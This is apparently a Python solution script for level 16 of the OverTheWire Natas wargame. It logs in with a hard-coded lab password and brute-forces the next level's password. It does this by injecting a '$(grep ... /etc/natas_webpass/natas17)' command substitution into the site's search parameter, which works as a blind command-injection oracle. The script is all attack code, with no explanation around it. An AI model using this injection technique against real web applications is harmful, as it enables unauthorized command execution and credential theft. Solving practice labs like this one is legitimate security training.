import requests, string
print("allo")
url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

characters = ''.join([string.ascii_letters, string.digits])
password = ''
exists_str = 'hacker'

for i in range (1,32):
    for char in characters:
        test = ''.join([password, char])
        uri = ''.join([url,'?needle=$(grep -E ^',test,'.* /etc/natas_webpass/natas17)hacker&submit=Search'])
        r = requests.get(uri, auth=(auth_username, auth_password))
        if exists_str not in r.text:
            password = test
            print("Length: {}, Password: {}".format(len(password), password))
            
print("password has been found")
